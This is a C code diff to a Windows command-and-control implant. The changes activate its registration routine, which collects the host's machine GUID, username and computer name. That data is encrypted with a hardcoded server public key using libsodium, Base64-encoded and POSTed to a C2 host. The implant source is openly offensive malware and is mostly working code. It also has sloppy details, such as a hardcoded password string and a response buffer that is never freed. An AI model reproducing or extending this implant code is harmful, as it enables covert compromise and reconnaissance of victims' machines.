@@ -12,16 +12,19 @@
 #include <stdio.h>
 #include <string.h>
 #include <iphlpapi.h>
+
+
 #include "opcodes.h"
 
 
 // Server's public key hardcoded - implants will use this to encrypt the initial registration message
 unsigned char server_public_key[] = {
-    0xb6, 0x7a, 0xae, 0xb5, 0x39, 0xc0, 0xb7, 0xdc,
-    0x0d, 0x2c, 0x68, 0xa0, 0xa5, 0xb3, 0x4f, 0xf4,
-    0xf2, 0x47, 0x58, 0xc4, 0x24, 0x87, 0x5c, 0xdf,
-    0xd9, 0xd9, 0x85, 0xe9, 0xab, 0x1d, 0x1d, 0x73
+    0x75, 0x44, 0x89, 0x0c, 0x9f, 0x96, 0xaf, 0xde,
+    0x9e, 0x10, 0x3a, 0xd9, 0x55, 0xaf, 0xac, 0xd4,
+    0xe1, 0x63, 0x8d, 0x15, 0xba, 0x39, 0x81, 0xb7,
+    0x7a, 0x27, 0x26, 0xc7, 0x79, 0xb0, 0x33, 0x75
 };
+
 
 
 LPBYTE ImplantID_PT1 = NULL; // MachineGUID
@@ -90,27 +93,6 @@ void FreeTaskResponse(TaskResponse *tResp) {
     free(tResp->Response);
     tResp->Response = NULL;
   }
-}
-
-// Function to encode the TaskResponse message
-BYTE *EncodeTaskResponse(TaskResponse *tr, size_t *stBuffSize) {
-  bool status = pb_get_encoded_size(stBuffSize, TaskResponse_fields, tr);
-  if (!status) {
-    DEBUG_PRINTF("Failed to get TaskReponse size: \n");
-    return NULL;
-  }
-
-  BYTE *trBuffer = (BYTE *)malloc(*stBuffSize);
-  pb_ostream_t stream = pb_ostream_from_buffer(trBuffer, *stBuffSize);
-
-  status = pb_encode(&stream, TaskResponse_fields, tr);
-  if (!status) {
-    DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
-    free(trBuffer);
-    return NULL;
-  }
-
-  return trBuffer;
 }
 
 int GetMachineGUID() {
@@ -212,79 +194,97 @@ char *SetID() {
 }
 
 
-// Function to register Implant with the Server
+#include <sodium.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
 int RegisterSelf() {
-    // if (sodium_init() == -1) {
-    //     DEBUG_PRINTF("libsodium initialization failed.\n");
-    //     return 1;
-    // }
 
-    // // Generate key pair for the implant
-    // unsigned char implant_pk[crypto_box_PUBLICKEYBYTES];  // Public key
-    // unsigned char implant_sk[crypto_box_SECRETKEYBYTES];  // Secret key
-    // crypto_box_keypair(implant_pk, implant_sk);
+    if (sodium_init() == -1) {
+        printf("libsodium initialization failed.\n");
+        return 1;
+    }
 
-    // // Convert public key to Base64 string
-    // char public_key_base64[crypto_box_PUBLICKEYBYTES * 2]; // Base64 encoding expands data by up to 33%
-    // sodium_bin2base64(public_key_base64, sizeof(public_key_base64), implant_pk, sizeof(implant_pk), sodium_base64_VARIANT_ORIGINAL);
+    //key pair for the implant
+    unsigned char implant_pk[crypto_box_PUBLICKEYBYTES];  // Public key
+    unsigned char implant_sk[crypto_box_SECRETKEYBYTES];  // Secret key
+    crypto_box_keypair(implant_pk, implant_sk);
+
+
+    char public_key_base64[crypto_box_PUBLICKEYBYTES * 2]; 
+    sodium_bin2base64(public_key_base64, sizeof(public_key_base64), implant_pk, sizeof(implant_pk), sodium_base64_VARIANT_ORIGINAL);
+
 
     RegisterImplant ri = RegisterImplant_init_zero;
-    ri.ImplantID = (char *)ImplantID; // Assuming SetID() or similar function sets this globally
-    DEBUG_PRINTF("IMPLANT GUID = %s\n", ri.ImplantID);
+    ri.ImplantID = (char *)ImplantID; 
+    printf("IMPLANT GUID = %s\n", ri.ImplantID);
 
-    // System information
+    // Get the current username
     DWORD usernameSize = MAX_PATH;
     char username[MAX_PATH];
     GetUserNameA(username, &usernameSize);
 
+    // Get the computer name
     DWORD computerNameSize = MAX_PATH;
     char computerName[MAX_PATH];
     GetComputerNameA(computerName, &computerNameSize);
 
+    // Assign computer name and username to the RegisterImplant structure
     ri.ComputerName = computerName;
     ri.Username = username;
     ri.Password = "SUPER_COMPLEX_PASSWORD_WOWZA!!!";
-    // Assign Base64-encoded public key to the PublicKey member
-    //ri.PublicKey = public_key_base64;
-    DEBUG_PRINTF("COMPUTER NAME = %s\n", ri.ComputerName);
-    DEBUG_PRINTF("USERNAME = %s\n", ri.Username);
-    //DEBUG_PRINTF("PUBLICKEY = %s\n", ri.PublicKey);
 
-    // Encode the registration info into a protobuf buffer
-    size_t outboundBufferSize = 0;
-    size_t inboundBufferSize = 0;
-    BYTE *registerBuffer = EncodeRegisterImplant(&ri, &outboundBufferSize);
-    DEBUG_PRINTF("outboundBufferSize = %llu\n", outboundBufferSize);
-    DEBUG_PRINTF("outboundBuffer = %s\n", registerBuffer);
-    // if (!buffer) {
-    //     DEBUG_PRINTF("Failed to encode registration info\n");
-    //     return 1;
-    // }
+    ri.PublicKey = public_key_base64;
+    printf("COMPUTER NAME = %s\n", ri.ComputerName);
+    printf("USERNAME = %s\n", ri.Username);
+    printf("PUBLICKEY = %s\n", ri.PublicKey);
 
-    // Encrypt the buffer using the server's public key
-    // unsigned char ciphertext[crypto_box_SEALBYTES + bufferSize];
-    // if (crypto_box_seal(ciphertext, buffer, bufferSize, server_public_key) != 0) {
-    //     DEBUG_PRINTF("Failed to encrypt registration info\n");
-    //     free(buffer);
-    //     return 1;
-    // }
-    // free(buffer);
-    // Send the encrypted data to the server
-    //size_t encryptedSize = sizeof(ciphertext);
-    LPBYTE response = HTTPRequest(L"POST", C2_HOST, REGISTER_PATH, C2_PORT, C2_UA,
-                                  registerBuffer, outboundBufferSize, &inboundBufferSize, USE_TLS);
+
+    size_t bufferSize = 0;
+    BYTE *buffer = EncodeRegisterImplant(&ri, &bufferSize);
+    if (!buffer) {
+        printf("Failed to encode registration info\n");
+        return 1;
+    }
+
+    //Encrypt the buffer using the server's public key
+    unsigned char ciphertext[crypto_box_SEALBYTES + bufferSize];
+    if (crypto_box_seal(ciphertext, buffer, bufferSize, server_public_key) != 0) {
+        printf("Failed to encrypt registration info\n");
+        free(buffer);
+        return 1;
+    }
+    free(buffer);
+
+    //Encode the ciphertext using Base64 encoding
+    size_t base64_maxlen = sodium_base64_ENCODED_LEN(sizeof(ciphertext), sodium_base64_VARIANT_ORIGINAL);
+    char *base64_ciphertext = malloc(base64_maxlen);
+    if (base64_ciphertext == NULL) {
+        printf("Error allocating memory for Base64\n");
+        return 1;
+    }
+    if (sodium_bin2base64(base64_ciphertext, base64_maxlen, ciphertext, sizeof(ciphertext), sodium_base64_VARIANT_ORIGINAL) == NULL) {
+        printf("Error encoding ciphertext to Base64\n");
+        free(base64_ciphertext);
+        return 1;
+    }
+
+    // Send the Base64 encoded ciphertext to the server
+    size_t encryptedSize = strlen(base64_ciphertext);
+    printf("Base64 encoded ciphertext: %s\n", base64_ciphertext);
+    LPBYTE response = HTTPRequest(L"POST", C2_HOST, REGISTER_PATH, C2_PORT, C2_UA, (LPBYTE)base64_ciphertext, encryptedSize, &encryptedSize, USE_TLS);
     if (response != NULL) {
-        DEBUG_PRINTF("Register Sent! Response received.\n");
-        free(response);
-        return 0;
+        printf("Register Sent! Response received.\n");
+        free(base64_ciphertext);
+        return 0; 
     }
 
-    if (response) {
-        free(response);
-    }
-
-    return 1; // Indicates failure to send or process registration
+    free(base64_ciphertext);
+    return 1; 
 }
+
+
 
 // Check-in with Server
 BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
